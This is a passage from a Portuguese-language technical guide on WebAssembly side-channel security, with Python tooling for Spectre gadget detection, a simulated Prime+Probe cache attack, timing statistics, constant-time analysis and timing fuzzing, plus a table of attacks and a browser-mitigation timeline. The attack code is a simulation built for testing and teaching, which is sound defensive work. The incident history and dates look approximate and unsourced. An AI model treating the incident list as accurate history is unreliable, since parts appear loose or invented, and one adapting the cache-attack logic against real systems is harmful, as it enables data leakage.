            (r'call_indirect', 'Indirect function call'),
            # Function pointer dereference
            (r'\*\(\s*\w+\s*\*\)', 'Function pointer dereference'),
            # Jump table
            (r'switch\s*\(', 'Switch statement (potential jump table)'),
        ]

        # Verificar padrões v1
        for pattern, description in patterns_v1:
            import re
            matches = re.finditer(pattern, code)
            for match in matches:
                gadgets.append({
                    'type': 'spectre_v1',
                    'pattern': pattern,
                    'description': description,
                    'position': match.start(),
                    'context': code[max(0, match.start()-50):match.end()+50]
                })

        # Verificar padrões v2
        for pattern, description in patterns_v2:
            import re
            matches = re.finditer(pattern, code)
            for match in matches:
                gadgets.append({
                    'type': 'spectre_v2',
                    'pattern': pattern,
                    'description': description,
                    'position': match.start(),
                    'context': code[max(0, match.start()-50):match.end()+50]
                })

        return gadgets

    def find_vulnerabilities(self, code: str) -> List[Dict]:
        """Encontrar vulnerabilidades Spectre"""
        vulnerabilities = []

        # Verificar se há mitigações implementadas
        mitigations = {
            'retpoline': 'retpoline' in code.lower(),
            'lfence': 'lfence' in code.lower(),
            'bounds_check': 'bounds_check' in code.lower(),
            'constant_time': 'constant_time' in code.lower(),
        }

        # Se não houver mitigações, é vulnerável
        if not any(mitigations.values()):
            vulnerabilities.append({
                'type': 'no_mitigations',
                'severity': 'high',
                'description': 'Nenhuma mitigação Spectre encontrada',
                'recommendation': 'Implementar retpoline e bounds checks'
            })

        # Verificar por gadgets específicos
        if 'call_indirect' in code and 'retpoline' not in code.lower():
            vulnerabilities.append({
                'type': 'indirect_call_without_retpoline',
                'severity': 'high',
                'description': 'Chamada indireta sem retpoline',
                'recommendation': 'Implementar retpoline para chamadas indiretas'
            })

        return vulnerabilities

    def generate_recommendations(self, results: Dict) -> List[str]:
        """Gerar recomendações"""
        recommendations = []

        if results['gadgets']:
            recommendations.append(
                f"Encontrados {len(results['gadgets'])} gadgets potenciais"
            )

        if results['vulnerabilities']:
            recommendations.append(
                f"Encontradas {len(results['vulnerabilities'])} vulnerabilidades"
            )

        # Recomendações específicas
        for vuln in results['vulnerabilities']:
            if vuln['type'] == 'no_mitigations':
                recommendations.append(
                    "Implementar mitigações Spectre: retpoline, bounds checks"
                )
            elif vuln['type'] == 'indirect_call_without_retpoline':
                recommendations.append(
                    "Usar retpoline para todas as chamadas indiretas"
                )

        return recommendations

    def analyze_wasm_binary(self, wasm_path: str) -> Dict:
        """Analisar binário Wasm para vulnerabilidades"""
        results = {
            'gadgets': [],
            'vulnerabilities': [],
            'recommendations': []
        }

        # Usar wasm-objdump para analisar
        try:
            result = subprocess.run(
                ['wasm-objdump', '-x', wasm_path],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                output = result.stdout

                # Procurar por padrões vulneráveis
                if 'call_indirect' in output:
                    results['gadgets'].append({
                        'type': 'spectre_v2',
                        'description': 'Chamada indireta encontrada no binário',
                        'location': wasm_path
                    })

                if 'memory.grow' in output:
                    results['vulnerabilities'].append({
                        'type': 'memory_growth',
                        'severity': 'medium',
                        'description': 'Crescimento de memória pode facilitar ataques'
                    })

        except FileNotFoundError:
            results['recommendations'].append(
                'wasm-objdump não encontrado - instalar WebAssembly Binary Toolkit'
            )

        return results

# Exemplo de uso
def example_spectre_detection():
    detector = SpectreDetector()

    # Analisar código fonte
    results = detector.analyze_code('/home/Projetos/DevSecurity/src/main.rs')

    print("=== Análise de Spectre ===")
    print(f"Gadgets encontrados: {len(results['gadgets'])}")
    print(f"Vulnerabilidades: {len(results['vulnerabilities'])}")
    print(f"Recomendações: {len(results['recommendations'])}")

    for rec in results['recommendations']:
        print(f"  - {rec}")

    return results

if __name__ == '__main__':
    example_spectre_detection()
```

### 10.12.2 Frameworks de Ataque de Cache

```python
# Frameworks de ataque de cache

import numpy as np
from typing import List, Tuple, Dict
import time

class CacheAttackFramework:
    """Framework para testes de cache side-channel"""

    def __init__(self, cache_size: int = 32768, cache_line_size: int = 64):
        self.cache_size = cache_size
        self.cache_line_size = cache_line_size
        self.num_sets = cache_size // cache_line_size

    def prime_cache(self, eviction_set: List[int]) -> None:
        """Preencher cache com dados do atacante"""
        # Em um ataque real, isso acessaria endereços específicos
        # Aqui simulamos o comportamento
        for address in eviction_set:
            # Simular acesso à memória
            _ = address

    def probe_cache(self, eviction_set: List[int]) -> List[Tuple[int, float]]:
        """Medir tempo de acesso para detectar cache hits/misses"""
        results = []

        for address in eviction_set:
            start = time.perf_counter()
            # Simular acesso à memória
            _ = address
            end = time.perf_counter()

            elapsed = (end - start) * 1e9  # Converter para nanosegundos
            results.append((address, elapsed))

        return results

    def create_eviction_set(self, target_address: int) -> List[int]:
        """Criar conjunto de evição para um endereço alvo"""
        # Calcular endereços que mapeiam para o mesmo conjunto de cache
        set_index = (target_address // self.cache_line_size) % self.num_sets

        eviction_set = []
        for i in range(self.num_sets):
            address = (i * self.num_sets + set_index) * self.cache_line_size
            eviction_set.append(address)

        return eviction_set

    def run_prime_probe_attack(
        self,
        target_addresses: List[int],
        iterations: int = 1000
    ) -> Dict:
        """Executar ataque Prime+Probe"""
        results = {
            'target_addresses': target_addresses,
            'access_counts': {},
            'timings': {},
        }

        for target in target_addresses:
            eviction_set = self.create_eviction_set(target)
            access_count = 0
            timings = []

            for _ in range(iterations):
                # PRIME: preencher cache
                self.prime_cache(eviction_set)

                # Simular execução da vítima
                time.sleep(0.001)  # Simular processamento

                # PROBE: medir tempo de acesso
                probe_results = self.probe_cache(eviction_set)

                # Analisar resultados
                for address, elapsed in probe_results:
                    if elapsed < 100:  # Limiar para cache hit
                        access_count += 1
                        timings.append(elapsed)

            results['access_counts'][target] = access_count
            results['timings'][target] = timings

        return results

    def analyze_attack_results(self, results: Dict) -> Dict:
        """Analisar resultados do ataque"""
        analysis = {
            'most_accessed': None,
            'max_accesses': 0,
            'average_timing': {},
            'timing_variance': {},
        }

        for address, count in results['access_counts'].items():
            if count > analysis['max_accesses']:
                analysis['max_accesses'] = count
                analysis['most_accessed'] = address

            # Calcular estatísticas de timing
            timings = results['timings'][address]
            if timings:
                analysis['average_timing'][address] = np.mean(timings)
                analysis['timing_variance'][address] = np.var(timings)

        return analysis

# Exemplo de uso
def example_cache_attack():
    framework = CacheAttackFramework()

    # Endereços alvo (simulados)
    target_addresses = [0x1000, 0x2000, 0x3000]

    print("=== Ataque Cache Side-Channel ===")

    # Executar ataque
    results = framework.run_prime_probe_attack(target_addresses, iterations=100)

    # Analisar resultados
    analysis = framework.analyze_attack_results(results)

    print(f"Endereço mais acessado: {analysis['most_accessed']}")
    print(f"Máximo de acessos: {analysis['max_accesses']}")

    for address, avg_time in analysis['average_timing'].items():
        print(f"  {address}: média={avg_time:.2f}ns")

    return results

if __name__ == '__main__':
    example_cache_attack()
```

### 10.12.3 Bibliotecas de Medição de Timing

```python
# Bibliotecas de medição de timing

import time
import statistics
from typing import List, Callable, Dict
import numpy as np

class TimingMeasurementLibrary:
    """Biblioteca para medição de timing de alta resolução"""

    def __init__(self):
        self.measurements = {}

    def measure_function(
        self,
        name: str,
        func: Callable,
        iterations: int = 10000,
        warmup: int = 1000
    ) -> Dict:
        """Medir tempo de execução de uma função"""
        # Warmup
        for _ in range(warmup):
            func()

        # Medição
        times = []
        for _ in range(iterations):
            start = time.perf_counter_ns()
            func()
            end = time.perf_counter_ns()
            times.append(end - start)

        # Estatísticas
        stats = self.calculate_statistics(times)

        self.measurements[name] = {
            'times': times,
            'statistics': stats,
        }

        return stats

    def calculate_statistics(self, times: List[int]) -> Dict:
        """Calcular estatísticas de timing"""
        n = len(times)
        mean = statistics.mean(times)
        median = statistics.median(times)
        stdev = statistics.stdev(times) if n > 1 else 0
        variance = statistics.variance(times) if n > 1 else 0

        # Quartis
        sorted_times = sorted(times)
        q1 = sorted_times[n // 4]
        q3 = sorted_times[3 * n // 4]
        iqr = q3 - q1

        # Coeficiente de variação
        cv = stdev / mean if mean > 0 else 0

        return {
            'n': n,
            'mean': mean,
            'median': median,
            'stdev': stdev,
            'variance': variance,
            'min': min(times),
            'max': max(times),
            'q1': q1,
            'q3': q3,
            'iqr': iqr,
            'cv': cv,
        }

    def compare_measurements(
        self,
        name1: str,
        name2: str,
        alpha: float = 0.01
    ) -> Dict:
        """Comparar duas medições de timing"""
        if name1 not in self.measurements or name2 not in self.measurements:
            return {'error': 'Medições não encontradas'}

        times1 = self.measurements[name1]['times']
        times2 = self.measurements[name2]['times']

        # Teste t de Welch
        t_stat, p_value = self.welch_t_test(times1, times2)

        # Tamanho do efeito (Cohen's d)
        effect_size = self.cohens_d(times1, times2)

        return {
            'name1': name1,
            'name2': name2,
            't_statistic': t_stat,
            'p_value': p_value,
            'is_significant': p_value < alpha,
            'effect_size': effect_size,
            'mean_difference': statistics.mean(times1) - statistics.mean(times2),
            'relative_difference': (
                abs(statistics.mean(times1) - statistics.mean(times2)) /
                max(statistics.mean(times1), statistics.mean(times2))
            ),
        }

    def welch_t_test(
        self,
        sample1: List[int],
        sample2: List[int]
    ) -> Tuple[float, float]:
        """Teste t de Welch"""
        n1 = len(sample1)
        n2 = len(sample2)

        mean1 = statistics.mean(sample1)
        mean2 = statistics.mean(sample2)

        var1 = statistics.variance(sample1)
        var2 = statistics.variance(sample2)

        # Erro padrão
        se = np.sqrt(var1 / n1 + var2 / n2)

        # Estatística t
        t = (mean1 - mean2) / se

        # Aproximação dos graus de liberdade (Welch-Satterthwaite)
        df = (var1 / n1 + var2 / n2) ** 2 / (
            (var1 / n1) ** 2 / (n1 - 1) +
            (var2 / n2) ** 2 / (n2 - 1)
        )

        # p-valor (aproximação)
        p_value = self.t_dist_p_value(abs(t), df)

        return t, p_value

    def t_dist_p_value(self, t: float, df: float) -> float:
        """Aproximação do p-valor da distribuição t"""
        # Usando função beta regularizada incompleta
        x = df / (df + t * t)
        return self.regularized_incomplete_beta(x, df / 2, 0.5)

    def regularized_incomplete_beta(self, x: float, a: float, b: float) -> float:
        """Beta regularizada incompleta (aproximação)"""
        if x < 0 or x > 1:
            return 0
        if x == 0 or x == 1:
            return x

        # Aproximação usando série de Taylor
        result = 0
        term = 1

        for i in range(100):
            term *= (a + i) * x / (a + b + i)
            result += term / (a + i)

        return np.power(x, a) * np.power(1 - x, b) * result / self.beta(a, b)

    def beta(self, a: float, b: float) -> float:
        """Função beta"""
        return self.gamma(a) * self.gamma(b) / self.gamma(a + b)

    def gamma(self, n: float) -> float:
        """Função gamma (aproximação)"""
        if n < 0.5:
            return np.pi / (np.sin(np.pi * n) * self.gamma(1 - n))

        n -= 1
        g = 7
        c = [
            0.99999999999980993,
            676.5203681218851,
            -1259.1392167224028,
            771.32342877765313,
            -176.61502916214059,
            12.507343278686905,
            -0.13857109526572012,
            9.9843695780195716e-6,
            1.5056327351493116e-7
        ]

        x = c[0]
        for i in range(1, g + 2):
            x += c[i] / (n + i)

        t = n + g + 0.5
        return np.sqrt(2 * np.pi) * np.power(t, n + 0.5) * np.exp(-t) * x

    def cohens_d(self, sample1: List[int], sample2: List[int]) -> float:
        """Cohen's d (tamanho do efeito)"""
        n1 = len(sample1)
        n2 = len(sample2)

        mean1 = statistics.mean(sample1)
        mean2 = statistics.mean(sample2)

        var1 = statistics.variance(sample1)
        var2 = statistics.variance(sample2)

        # Desvio padrão pooled
        pooled_std = np.sqrt(
            ((n1 - 1) * var1 + (n2 - 1) * var2) / (n1 + n2 - 2)
        )

        if pooled_std == 0:
            return 0

        return (mean1 - mean2) / pooled_std

    def detect_timing_leak(
        self,
        operation1: Callable,
        operation2: Callable,
        name1: str = 'operation1',
        name2: str = 'operation2',
        iterations: int = 10000
    ) -> Dict:
        """Detectar timing leak entre duas operações"""
        # Medir ambas as operações
        stats1 = self.measure_function(name1, operation1, iterations)
        stats2 = self.measure_function(name2, operation2, iterations)

        # Comparar
        comparison = self.compare_measurements(name1, name2)

        return {
            'stats1': stats1,
            'stats2': stats2,
            'comparison': comparison,
            'has_leak': comparison.get('is_significant', False),
        }

    def generate_report(self) -> str:
        """Gerar relatório de medições"""
        report = "=== Relatório de Medição de Timing ===\n\n"

        for name, data in self.measurements.items():
            stats = data['statistics']
            report += f"{name}:\n"
            report += f"  Média: {stats['mean']:.2f}ns\n"
            report += f"  Mediana: {stats['median']:.2f}ns\n"
            report += f"  Desvio Padrão: {stats['stdev']:.2f}ns\n"
            report += f"  CV: {stats['cv']:.4f}\n"
            report += f"  Min: {stats['min']}ns, Max: {stats['max']}ns\n\n"

        return report

# Exemplo de uso
def example_timing_measurement():
    lib = TimingMeasurementLibrary()

    # Definir operações
    def operation_a():
        sum(range(1000))

    def operation_b():
        sum(range(10000))

    # Medir operações
    print("=== Medição de Timing ===")
    stats_a = lib.measure_function('operation_a', operation_a, iterations=1000)
    stats_b = lib.measure_function('operation_b', operation_b, iterations=1000)

    # Comparar
    comparison = lib.compare_measurements('operation_a', 'operation_b')
    print(f"Comparação: {comparison}")

    # Gerar relatório
    report = lib.generate_report()
    print(report)

    return lib

if __name__ == '__main__':
    example_timing_measurement()
```

### 10.12.4 Análise Estática para Violações de Constant-Time

```python
# Análise estática para violações de constant-time

import re
from typing import List, Dict, Tuple
from dataclasses import dataclass
from enum import Enum

class ViolationType(Enum):
    SECRET_DEPENDENT_BRANCH = "secret_dependent_branch"
    SECRET_DEPENDENT_INDEX = "secret_dependent_index"
    SECRET_DEPENDENT_MEMORY_ACCESS = "secret_dependent_memory_access"
    TIMING_LEAK = "timing_leak"

@dataclass
class ConstantTimeViolation:
    violation_type: ViolationType
    line_number: int
    code_snippet: str
    description: str
    severity: str  # 'high', 'medium', 'low'

class ConstantTimeAnalyzer:
    """Analisador estático para violações de constant-time"""

    def __init__(self):
        self.violations = []
        self.secret_variables = set()

    def analyze_code(self, code: str) -> List[ConstantTimeViolation]:
        """Analisar código para violações de constant-time"""
        self.violations = []
        lines = code.split('\n')

        # Identificar variáveis secretas
        self.secret_variables = self.find_secret_variables(code)

        # Analisar cada linha
        for i, line in enumerate(lines, 1):
            self.analyze_line(line, i)

        return self.violations

    def find_secret_variables(self, code: str) -> set:
        """Encontrar variáveis que podem conter dados secretos"""
        secret_patterns = [
            r'secret',
            r'key',
            r'password',
            r'token',
            r'private',
            r'sensitive',
            r'confidential',
        ]

        secret_vars = set()
        for pattern in secret_patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                # Encontrar o nome da variável
                start = max(0, match.start() - 20)
                end = min(len(code), match.end() + 20)
                context = code[start:end]

                # Extrair nome da variável
                var_match = re.search(r'(\w+)\s*=', context)
                if var_match:
                    secret_vars.add(var_match.group(1))

        return secret_vars

    def analyze_line(self, line: str, line_number: int):
        """Analisar uma linha para violações"""
        # Verificar branches dependentes de dados secretos
        self.check_secret_dependent_branch(line, line_number)

        # Verificar indexação com dados secretos
        self.check_secret_dependent_index(line, line_number)

        # Verificar acessos à memória com dados secretos
        self.check_secret_dependent_memory_access(line, line_number)

    def check_secret_dependent_branch(self, line: str, line_number: int):
        """Verificar branches dependentes de dados secretos"""
        branch_patterns = [
            r'if\s*\(\s*\w+\s*[><=!]+\s*\w+',
            r'else\s+if\s*\(',
            r'match\s*\(',
            r'switch\s*\(',
        ]

        for pattern in branch_patterns:
            if re.search(pattern, line):
                # Verificar se a condição usa dados secretos
                for secret_var in self.secret_variables:
                    if secret_var in line:
                        self.violations.append(ConstantTimeViolation(
                            violation_type=ViolationType.SECRET_DEPENDENT_BRANCH,
                            line_number=line_number,
                            code_snippet=line.strip(),
                            description=f"Branch dependente de variável secreta: {secret_var}",
                            severity='high'
                        ))
                        break

    def check_secret_dependent_index(self, line: str, line_number: int):
        """Verificar indexação com dados secretos"""
        index_patterns = [
            r'\w+\[\s*\w+\s*\]',
            r'\w+\.\w+\[\s*\w+\s*\]',
        ]

        for pattern in index_patterns:
            matches = re.finditer(pattern, line)
            for match in matches:
                index_content = match.group()

                # Verificar se o índice usa dados secretos
                for secret_var in self.secret_variables:
                    if secret_var in index_content:
                        self.violations.append(ConstantTimeViolation(
                            violation_type=ViolationType.SECRET_DEPENDENT_INDEX,
                            line_number=line_number,
                            code_snippet=line.strip(),
                            description=f"Acesso a array com índice secreto: {secret_var}",
                            severity='high'
                        ))
                        break

    def check_secret_dependent_memory_access(self, line: str, line_number: int):
        """Verificar acessos à memória com dados secretos"""
        memory_patterns = [
            r'ptr\s*\+',
            r'address\s*\+',
            r'offset\s*\+',
        ]

        for pattern in memory_patterns:
            if re.search(pattern, line):
                # Verificar se o endereço usa dados secretos
                for secret_var in self.secret_variables:
                    if secret_var in line:
                        self.violations.append(ConstantTimeViolation(
                            violation_type=ViolationType.SECRET_DEPENDENT_MEMORY_ACCESS,
                            line_number=line_number,
                            code_snippet=line.strip(),
                            description=f"Acesso à memória com endereço secreto: {secret_var}",
                            severity='high'
                        ))
                        break

    def check_timing_leak(self, code: str) -> bool:
        """Verificar se há timing leak potencial"""
        # Procurar por operações que podem ter tempo variável
        timing_patterns = [
            r'sleep\s*\(',
            r'thread::sleep\s*\(',
            r'wait\s*\(',
            r'delay\s*\(',
        ]

        for pattern in timing_patterns:
            if re.search(pattern, code):
                return True

        return False

    def generate_report(self) -> str:
        """Gerar relatório de análise"""
        report = "=== Relatório de Análise Constant-Time ===\n\n"

        # Estatísticas
        high_violations = [v for v in self.violations if v.severity == 'high']
        medium_violations = [v for v in self.violations if v.severity == 'medium']
        low_violations = [v for v in self.violations if v.severity == 'low']

        report += f"Violações encontradas: {len(self.violations)}\n"
        report += f"  - Alta severidade: {len(high_violations)}\n"
        report += f"  - Média severidade: {len(medium_violations)}\n"
        report += f"  - Baixa severidade: {len(low_violations)}\n\n"

        # Detalhes das violações
        for violation in self.violations:
            report += f"Linha {violation.line_number} [{violation.severity.upper()}]:\n"
            report += f"  Tipo: {violation.violation_type.value}\n"
            report += f"  Código: {violation.code_snippet}\n"
            report += f"  Descrição: {violation.description}\n\n"

        return report

    def suggest_fixes(self) -> List[str]:
        """Sugerir correções para as violações"""
        fixes = []

        for violation in self.violations:
            if violation.violation_type == ViolationType.SECRET_DEPENDENT_BRANCH:
                fixes.append(
                    f"Linha {violation.line_number}: Substituir branch por operação aritmética"
                )
            elif violation.violation_type == ViolationType.SECRET_DEPENDENT_INDEX:
                fixes.append(
                    f"Linha {violation.line_number}: Usar lookup constante-time"
                )
            elif violation.violation_type == ViolationType.SECRET_DEPENDENT_MEMORY_ACCESS:
                fixes.append(
                    f"Linha {violation.line_number}: Usar acesso à memória constante-time"
                )

        return fixes

# Exemplo de uso
def example_constant_time_analysis():
    analyzer = ConstantTimeAnalyzer()

    # Código de exemplo com violações
    code = """
fn vulnerable_function(data: &[u8], secret: u8) -> u8 {
    if secret > 128 {  // Branch dependente de dado secreto
        data[secret as usize]  // Acesso com índice secreto
    } else {
        0
    }
}
"""

    print("=== Análise Constant-Time ===")

    # Analisar código
    violations = analyzer.analyze_code(code)

    # Gerar relatório
    report = analyzer.generate_report()
    print(report)

    # Sugerir correções
    fixes = analyzer.suggest_fixes()
    print("Correções sugeridas:")
    for fix in fixes:
        print(f"  - {fix}")

    return analyzer

if __name__ == '__main__':
    example_constant_time_analysis()
```

### 10.12.5 Fuzzing para Leaks de Timing

```python
# Fuzzing para leaks de timing

import random
import time
from typing import List, Callable, Dict
from dataclasses import dataclass

@dataclass
class FuzzingResult:
    input_data: bytes
    timing: float
    is_anomaly: bool
    anomaly_score: float

class TimingFuzzer:
    """Fuzzer para detecção de timing leaks"""

    def __init__(self):
        self.results = []
        self.baseline_timing = None

    def establish_baseline(
        self,
        target_func: Callable,
        iterations: int = 10000
    ) -> float:
        """Estabelecer baseline de timing"""
        timings = []

        for _ in range(iterations):
            # Input aleatório normal
            input_data = bytes(random.randint(0, 255) for _ in range(32))

            start = time.perf_counter_ns()
            target_func(input_data)
            end = time.perf_counter_ns()

            timings.append(end - start)

        self.baseline_timing = sum(timings) / len(timings)
        return self.baseline_timing

    def generate_fuzz_inputs(
        self,
        num_inputs: int,
        input_size: int = 32,
        strategy: str = 'random'
    ) -> List[bytes]:
        """Gerar inputs de fuzzing"""
        inputs = []

        for _ in range(num_inputs):
            if strategy == 'random':
                # Input completamente aleatório
                input_data = bytes(random.randint(0, 255) for _ in range(input_size))

            elif strategy == 'boundary':
                # Inputs de fronteira
                if random.random() < 0.5:
                    input_data = bytes([0] * input_size)  # Todos zeros
                else:
                    input_data = bytes([255] * input_size)  # Todos uns

            elif strategy == 'structured':
                # Inputs estruturados
                input_data = self.generate_structured_input(input_size)

            else:
                input_data = bytes(random.randint(0, 255) for _ in range(input_size))

            inputs.append(input_data)

        return inputs

    def generate_structured_input(self, size: int) -> bytes:
        """Gerar input estruturado"""
        # Criar input com padrões específicos
        input_data = bytearray(size)

        # Preencher com padrão
        for i in range(size):
            if i % 4 == 0:
                input_data[i] = 0xAA
            elif i % 4 == 1:
                input_data[i] = 0x55
            elif i % 4 == 2:
                input_data[i] = 0xFF
            else:
                input_data[i] = 0x00

        return bytes(input_data)

    def fuzz_target(
        self,
        target_func: Callable,
        num_inputs: int = 10000,
        strategy: str = 'random'
    ) -> List[FuzzingResult]:
        """Executar fuzzing no target"""
        inputs = self.generate_fuzz_inputs(num_inputs, strategy=strategy)
        results = []

        for input_data in inputs:
            # Medir timing
            start = time.perf_counter_ns()
            target_func(input_data)
            end = time.perf_counter_ns()

            timing = end - start

            # Calcular score de anomalia
            if self.baseline_timing:
                anomaly_score = abs(timing - self.baseline_timing) / self.baseline_timing
            else:
                anomaly_score = 0

            is_anomaly = anomaly_score > 0.2  # 20% de desvio

            results.append(FuzzingResult(
                input_data=input_data,
                timing=timing,
                is_anomaly=is_anomaly,
                anomaly_score=anomaly_score
            ))

        self.results = results
        return results

    def analyze_results(self) -> Dict:
        """Analisar resultados do fuzzing"""
        if not self.results:
            return {'error': 'Nenhum resultado disponível'}

        # Estatísticas básicas
        timings = [r.timing for r in self.results]
        anomaly_scores = [r.anomaly_score for r in self.results]

        # Encontrar anomalias
        anomalies = [r for r in self.results if r.is_anomaly]

        # Agrupar por tipo de anomalia
        high_anomalies = [r for r in anomalies if r.anomaly_score > 0.5]
        medium_anomalies = [r for r in anomalies if 0.2 < r.anomaly_score <= 0.5]

        # Análise de padrões
        patterns = self.analyze_patterns(anomalies)

        return {
            'total_inputs': len(self.results),
            'anomalies_found': len(anomalies),
            'high_anomalies': len(high_anomalies),
            'medium_anomalies': len(medium_anomalies),
            'average_timing': sum(timings) / len(timings),
            'timing_variance': self.calculate_variance(timings),
            'patterns': patterns,
            'worst_anomaly': max(anomalies, key=lambda r: r.anomaly_score) if anomalies else None,
        }

    def analyze_patterns(self, anomalies: List[FuzzingResult]) -> Dict:
        """Analisar padrões nas anomalias"""
        patterns = {
            'all_zeros': 0,
            'all_ones': 0,
            'alternating': 0,
            'structured': 0,
            'other': 0,
        }

        for anomaly in anomalies:
            input_data = anomaly.input_data

            # Verificar padrões
            if all(b == 0 for b in input_data):
                patterns['all_zeros'] += 1
            elif all(b == 255 for b in input_data):
                patterns['all_ones'] += 1
            elif self.is_alternating(input_data):
                patterns['alternating'] += 1
            elif self.is_structured(input_data):
                patterns['structured'] += 1
            else:
                patterns['other'] += 1

        return patterns

    def is_alternating(self, data: bytes) -> bool:
        """Verificar se dados são alternados"""
        if len(data) < 2:
            return False

        for i in range(1, len(data)):
            if data[i] == data[i - 1]:
                return False

        return True

    def is_structured(self, data: bytes) -> bool:
        """Verificar se dados são estruturados"""
        # Verificar se segue algum padrão conhecido
        patterns = [
            bytes([0xAA, 0x55] * (len(data) // 2)),
            bytes([0xFF, 0x00] * (len(data) // 2)),
            bytes(range(len(data) % 256)),
        ]

        for pattern in patterns:
            if data[:len(pattern)] == pattern:
                return True

        return False

    def calculate_variance(self, values: List[float]) -> float:
        """Calcular variância"""
        if len(values) < 2:
            return 0

        mean = sum(values) / len(values)
        variance = sum((x - mean) ** 2 for x in values) / len(values)
        return variance

    def generate_report(self) -> str:
        """Gerar relatório de fuzzing"""
        analysis = self.analyze_results()

        report = "=== Relatório de Fuzzing de Timing ===\n\n"

        report += f"Total de inputs testados: {analysis['total_inputs']}\n"
        report += f"Anomalias encontradas: {analysis['anomalies_found']}\n"
        report += f"  - Alta severidade: {analysis['high_anomalies']}\n"
        report += f"  - Média severidade: {analysis['medium_anomalies']}\n\n"

        report += f"Timing médio: {analysis['average_timing']:.2f}ns\n"
        report += f"Variância: {analysis['timing_variance']:.2f}\n\n"

        if analysis['patterns']:
            report += "Padrões de anomalias:\n"
            for pattern, count in analysis['patterns'].items():
                report += f"  - {pattern}: {count}\n"

        if analysis['worst_anomaly']:
            worst = analysis['worst_anomaly']
            report += f"\nPior anomalia:\n"
            report += f"  Input: {worst.input_data.hex()}\n"
            report += f"  Timing: {worst.timing}ns\n"
            report += f"  Score: {worst.anomaly_score:.4f}\n"

        return report

# Exemplo de uso
def example_timing_fuzzing():
    fuzzer = TimingFuzzer()

    # Função de teste com timing leak
    def vulnerable_function(data: bytes) -> int:
        # Timing leak: retorna mais rápido para inputs específicos
        if data[0] == 0x42:
            return sum(data)
        else:
            # Operação mais lenta
            time.sleep(0.0001)
            return sum(data)

    print("=== Fuzzing de Timing ===")

    # Estabelecer baseline
    baseline = fuzzer.establish_baseline(vulnerable_function, iterations=1000)
    print(f"Baseline: {baseline:.2f}ns")

    # Executar fuzzing
    results = fuzzer.fuzz_target(vulnerable_function, num_inputs=5000)

    # Analisar resultados
    analysis = fuzzer.analyze_results()
    print(f"Anomalias encontradas: {analysis['anomalies_found']}")

    # Gerar relatório
    report = fuzzer.generate_report()
    print(report)

    return fuzzer

if __name__ == '__main__':
    example_timing_fuzzing()
```

## 10.13 Casos Reais e Incidentes

Esta seção apresenta casos reais de ataques por side-channels em WebAssembly e as respostas dos fornecedores de navegadores.

### 10.13.1 Ataques Conhecidos de Side-Channel em Wasm

```
+------------------------------------------------------------------+
|           ATAQUES CONHECIDOS DE SIDE-CHANNEL EM WASM              |
+------------------------------------------------------------------+
|                                                                  |
|  1. SPECTRE VIA WASM (2018-2019)                                 |
|  +------------------------------------------------------------+  |
|  |  Pesquisadores demonstraram que Wasm pode ser usado como   |  |
|  |  veículo para ataques Spectre cross-origin.                |  |
|  |                                                             |  |
|  |  Vetor: Módulo Wasm com gadgets Spectre v1/v2              |  |
|  |  Alvo: Dados de outras origens no navegador                |  |
|  |  Impacto: Extração de dados sensíveis                       |  |
|  |  Mitigação: Site Isolation, COOP/COEP                       |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  2. CACHE ATTACKS VIA SHAREDARRAYBUFFER (2019)                   |
|  +------------------------------------------------------------+  |
|  |  SharedArrayBuffer foi usado como canal de alta resolução   |  |
|  |  para medição de tempo em ataques de cache.                 |  |
|  |                                                             |  |
|  |  Vetor: SharedArrayBuffer como timer                        |  |
|  |  Alvo: Dados em cache de outros processos                   |  |
|  |  Impacto: Timing attacks de alta precisão                   |  |
|  |  Mitigação: Restrições de SharedArrayBuffer                  |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  3. BRANCH TARGET INJECTION VIA WASM TABLE (2020)                |
|  +------------------------------------------------------------+  |
|  |  Tabelas de funções Wasm foram exploradas para injeção      |  |
|  |  de branch targets via BTB.                                 |  |
|  |                                                             |  |
|  |  Vetor: call_indireto via tabela                            |  |
|  |  Alvo: Branch predictor do CPU                              |  |
|  |  Impacto: Execução de código arbitrário especulativo        |  |
|  |  Mitigação: Retpoline, STIBP                                 |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  4. TIMING ATTACKS EM CRYPTO LIBRARIES (2020-2021)              |
|  +------------------------------------------------------------+  |
|  |  Bibliotecas de criptografia em Wasm com implementações     |  |
|  |  não constant-time foram vulneráveis a timing attacks.      |  |
|  |                                                             |  |
|  |  Vetor: Código Wasm com branches dependentes de dados       |  |
|  |  Alvo: Chaves de criptografia                               |  |
|  |  Impacto: Extração de chaves secretas                       |  |
|  |  Mitigação: Implementações constant-time                    |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  5. CACHE POISONING VIA WASM MEMORY (2021)                      |
|  +------------------------------------------------------------+  |
|  |  Memória linear do Wasm foi usada para envenenar cache      |  |
|  |  de outros processos.                                       |  |
|  |                                                             |  |
|  |  Vetor: Acessos à memória linear                            |  |
|  |  Alvo: Cache de outros processos                            |  |
|  |  Impacto: Degradação de performance e timing attacks        |  |
|  |  Mitigação: Cache partitioning, memory isolation            |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

### 10.13.2 Respostas dos Fornecedores de Navegadores

```javascript
// Respostas dos fornecedores de navegadores a side-channels em Wasm

// 1. Chrome/V8
const chromeResponse = {
    timeline: [
        {
            date: '2018-01-03',
            event: 'Spectre publicado',
            action: 'Habilitar Site Isolation por padrão'
        },
        {
            date: '2018-05-01',
            event: 'SharedArrayBuffer exploitable',
            action: 'Desabilitar SharedArrayBuffer por padrão'
        },
        {
            date: '2019-01-01',
            event: 'Wasm Spectre gadgets identificados',
            action: 'Implementar COOP/COEP headers'
        },
        {
            date: '2020-06-01',
            event: 'Branch target injection via Wasm',
            action: 'Implementar retpoline para chamadas indiretas'
        }
    ],
    mitigations: [
        'Site Isolation (habilitado por padrão desde Chrome 67)',
        'Cross-Origin Isolation (COOP/COEP)',
        'SharedArrayBuffer restrictions',
        'JIT hardening',
        'Wasm bounds check enforcement',
        'Retpoline para chamadas indiretas',
        'STIBP/IBPB support'
    ],
    performanceImpact: {
        siteIsolation: '5-15% overhead',
        coOpCoEp: '1-3% overhead',
        sharedArrayBuffer: 'Desabilitado por padrão',
        retpoline: '10-30% overhead para chamadas indiretas'
    }
};

// 2. Firefox/SpiderMonkey
const firefoxResponse = {
    timeline: [
        {
            date: '2018-01-03',
            event: 'Spectre publicado',
            action: 'Habilitar Fission (Site Isolation)'
